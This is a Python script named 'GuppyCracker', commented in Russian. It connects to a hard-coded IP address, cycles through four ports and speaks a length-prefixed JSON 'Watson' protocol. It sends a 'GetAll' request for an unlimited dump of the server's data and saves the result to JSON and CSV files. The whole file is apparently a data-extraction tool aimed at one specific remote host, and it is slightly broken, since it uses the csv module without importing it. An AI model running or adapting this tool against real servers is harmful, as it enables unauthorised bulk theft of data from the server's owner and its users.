import socket
import json
import struct
import time
import uuid
import sys
from collections import defaultdict

# === КОНФИГУРАЦИЯ ===
TARGET_IP = "185.216.192.14"
TARGET_PORTS = [9010, 9011, 9004, 9005]
TIMEOUT = 30

class GuppyCracker:
    def __init__(self):
        self.sock = None
        self.connected_ip = None
        self.connected_port = None

    def connect(self):
        """Подключение с перебором портов."""
        for port in TARGET_PORTS:
            try:
                print(f"🔌 Попытка подключения к {TARGET_IP}:{port}...")
                self.sock = socket.create_connection((TARGET_IP, port), timeout=TIMEOUT)
                self.connected_ip = TARGET_IP
                self.connected_port = port
                self.sock.settimeout(TIMEOUT)
                
                # Отправляем HELLO
                hello = {
                    "Type": "Hello",
                    "Payload": {
                        "Protocol": "Watson",
                        "Version": "1.0",
                        "Client": "GuppyCracker",
                        "RequestId": str(uuid.uuid4())
                    }
                }
                self._send_msg(hello)
                
                # Ждем ответ
                hello_resp = self._recv_msg()
                if hello_resp:
                    print(f"✅ Успех! Подключено к {self.connected_ip}:{self.connected_port}")
                    return True
                else:
                    print(f"✅ Подключено к {self.connected_ip}:{self.connected_port} (без Hello)")
                    return True
                    
            except socket.timeout:
                print(f"  ⏳ Таймаут на порту {port}")
                if self.sock: self.sock.close()
            except ConnectionRefusedError:
                print(f"  ❌ Порт {port} закрыт")
                if self.sock: self.sock.close()
            except Exception as e:
                print(f"  ⚠️ Ошибка на порту {port}: {e}")
                if self.sock: self.sock.close()
                
        print("❌ Не удалось подключиться ни к одному порту.")
        return False

    def _send_msg(self, msg: dict):
        """Отправка сообщения в формате Watson."""
        try:
            json_bytes = json.dumps(msg, separators=(',', ':')).encode('utf-8')
            length = struct.pack('>I', len(json_bytes))
            self.sock.sendall(length + json_bytes)
        except Exception as e:
            print(f"⚠️ Ошибка отправки: {e}")
            raise

    def _recv_msg(self) -> dict:
        """Получение сообщения в формате Watson."""
        try:
            header = b""
            while len(header) < 4:
                chunk = self.sock.recv(4 - len(header))
                if not chunk: return None
                header += chunk
            
            length = struct.unpack('>I', header)[0]
            if length == 0: return None

            body = b""
            while len(body) < length:
                chunk = self.sock.recv(length - len(body))
                if not chunk: return None
                body += chunk
            
            return json.loads(body.decode('utf-8'))
        except Exception as e:
            print(f"⚠️ Ошибка получения: {e}")
            return None

    def get_full_dump(self) -> dict:
        """Запрос полного дампа данных."""
        try:
            request = {
                "Type": "AppExchange",
                "Action": "GetAll",
                "Payload": {
                    "Scope": "All",
                    "Limit": 0,
                    "Format": "JSON",
                    "RequestId": str(uuid.uuid4())
                }
            }
            
            print(f"📤 Отправка запроса GetAll...")
            self._send_msg(request)
            return self._recv_msg()
        except Exception as e:
            print(f"⚠️ Ошибка при получении дампа: {e}")
            return {}

    def close(self):
        if self.sock:
            self.sock.close()
            print("🔚 Сессия закрыта.")

def process_and_save(raw_data: dict):
    """
    Обработка и сохранение данных.
    """
    if not raw_data:
        print("⚠️ Нет данных для сохранения.")
        return

    # Извлекаем Payload
    payload = raw_data.get("Payload", {})
    
    # Если Payload — это список, превращаем в словарь с ключами
    if isinstance(payload, list):
        data_dict = defaultdict(list)
        for item in payload:
            if isinstance(item, dict):
                # Пытаемся определить тип по ключам
                key = item.get("Type", "Unknown")
                data_dict[key].append(item)
            else:
                data_dict["Items"].append(item)
        payload = dict(data_dict)
    
    # 1. Сохраняем полный JSON
    json_filename = "guppy_dump_full.json"
    with open(json_filename, "w", encoding="utf-8") as f:
        json.dump(raw_data, f, indent=2, ensure_ascii=False)
    print(f"💾 Полный JSON сохранен: {json_filename}")

    # 2. Сохраняем CSV (для Excel)
    csv_filename = "guppy_dump_export.csv"
    with open(csv_filename, "w", encoding="utf-8", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["Type", "Id", "Data"])
        
        for key, value in payload.items():
            if isinstance(value, list):
                for i, item in enumerate(value):
                    item_str = json.dumps(item, ensure_ascii=False) if isinstance(item, dict) else str(item)
                    writer.writerow([key, i, item_str])
            else:
                writer.writerow([key, "", str(value)])
                
    print(f"💾 CSV сохранен: {csv_filename}")
    
    # Статистика
    total_items = sum(len(v) if isinstance(v, list) else 1 for v in payload.values())
    print(f"📊 Всего записей: {total_items}")

if __name__ == "__main__":
    print("🚀 Запуск GuppyCracker (Final)...")
    client = GuppyCracker()
    
    # Пытаемся подключиться и получить дамп
    max_retries = 3
    for attempt in range(max_retries):
        try:
            if client.connect():
                print(f"📤 Попытка №{attempt + 1}...")
                raw_data = client.get_full_dump()
                
                # Если данные пустые, но соединение есть, пробуем еще раз
                if not raw_data and attempt < max_retries - 1:
                    print("⚠️ Пустой ответ, повторяем...")
                    continue
                    
                process_and_save(raw_data)
                break # Успех
            else:
                print("⚠️ Не удалось подключиться, повторяем...")
        except Exception as e:
            print(f"⚠️ Ошибка на попытке {attempt + 1}: {e}")
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            else:
                print(f"💀 Фатальная ошибка после {max_retries} попыток.")
        finally:
            client.close()